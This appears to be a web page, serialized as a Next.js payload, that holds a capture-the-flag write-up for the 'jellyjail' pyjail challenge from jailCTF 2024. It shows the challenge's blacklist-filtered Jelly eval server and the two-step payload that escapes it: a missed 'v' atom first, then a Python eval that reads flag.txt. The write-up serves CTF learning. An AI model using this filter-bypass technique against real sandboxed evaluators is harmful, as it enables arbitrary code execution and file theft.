1:"$Sreact.fragment"
2:I[10453,["/_next/static/chunks/b9afcb09c56609a6.js","/_next/static/chunks/59d5dd52dd9fcb16.js","/_next/static/chunks/0eb309e820c00a6d.js","/_next/static/chunks/239c8c4944a9f036.js","/_next/static/chunks/39b99946d2be6a43.js"],"default"]
3:I[97367,["/_next/static/chunks/ff1a16fafef87110.js","/_next/static/chunks/b71c1cfea9076b4b.js"],"OutletBoundary"]
4:"$Sreact.suspense"
:HL["https://gist.github.com/user-attachments/assets/39b2cd25-132a-43bf-84a4-a7b29b78a38a","image"]
:HL["https://gist.github.com/user-attachments/assets/c76f30bc-7abd-46fc-ae5b-bb5b697e2515","image"]
0:{"buildId":"QiRS6Sx9Ttvp1BSl4xu2I","rsc":["$","$1","c",{"children":[["$","div",null,{"children":["$","main",null,{"className":"text-pretty max-w-5xl mx-auto text-sm [&_h1]:text-5xl [&_h1]:font-semibold [&_h1]:mb-8 [&_blockquote]:text-secondary [&_blockquote]:space-y-3 [&_blockquote]:border-l-4 [&_blockquote]:border-secondary [&_blockquote]:pl-5 [&_blockquote]:mb-5 [&>_p]:my-4 [&_img]:my-5 [&_ul]:list-disc [&_ul]:pl-6 [&_ol]:list-decimal [&_ol]:pl-6 [&_img]:rounded [&_li]:my-2","children":[["$","h1","h1-0",{"children":"jailCTF 2024 — jellyjail"}],"\n",["$","blockquote","blockquote-0",{"children":["\n",["$","p","p-0",{"children":"how can one golf with jelly if it just explodes when you hit it with a large metal golf club?"}],"\n",["$","p","p-1",{"children":["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"nc challs1.pyjail.club 5999"}]}],"\n"]}],"\n",["$","p","p-0",{"children":"We're given a Python server that looks like this:"}],"\n",["$","$L2","pre-0",{"className":"my-2","children":"#!/usr/local/bin/python3\n# https://github.com/DennisMitchell/jellylanguage/tree/70c9fd93ab009c05dc396f8cc091f72b212fb188\nfrom jellylanguage.jelly.interpreter import jelly_eval\n\ninp = input()[:2]\nbanned = \"0123456789ỌŒƓVÐ¡\"  # good thing i blocked all ways of getting to python eval !!! yep\n\nif not all([c not in inp for c in banned]):\n    print('stop using banned')\n    exit()\n\njelly_eval(inp, [])","language":"py"}],"\n",["$","p","p-1",{"children":["The server bans numbers and a few ",["$","a","a-0",{"href":"https://github.com/DennisMitchell/jellylanguage/wiki/Atoms","children":"eval atoms"}],", but they seemed to have missed lowercase ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"v"}],":"]}],"\n",["$","p","p-2",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/39b2cd25-132a-43bf-84a4-a7b29b78a38a","alt":"image"}]}],"\n",["$","p","p-3",{"children":"Then, we can send"}],"\n",["$","$L2","pre-1",{"className":"my-2","children":"ɠv"}],"\n",["$","p","p-4",{"children":"as our payload to read a line from STDIN and evaluate it as Jelly, circumventing their blacklist. Without a blacklist, we can send"}],"\n",["$","$L2","pre-2",{"className":"my-2","children":"“print(open('flag.txt').read())”ŒV"}],"\n",["$","p","p-5",{"children":"to evaluate"}],"\n",["$","$L2","pre-3",{"className":"my-2","children":"print(open('flag.txt').read())","language":"py"}],"\n",["$","p","p-6",{"children":"as Python code and get the flag."}],"\n",["$","p","p-7",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/c76f30bc-7abd-46fc-ae5b-bb5b697e2515","alt":"image"}]}]]}]}],[["$","script","script-0",{"src":"/_next/static/chunks/59d5dd52dd9fcb16.js","async":true}],["$","script","script-1",{"src":"/_next/static/chunks/0eb309e820c00a6d.js","async":true}],["$","script","script-2",{"src":"/_next/static/chunks/239c8c4944a9f036.js","async":true}],["$","script","script-3",{"src":"/_next/static/chunks/39b99946d2be6a43.js","async":true}]],["$","$L3",null,{"children":["$","$4",null,{"name":"Next.MetadataOutlet","children":"$@5"}]}]]}],"loading":null,"isPartial":false}
5:null
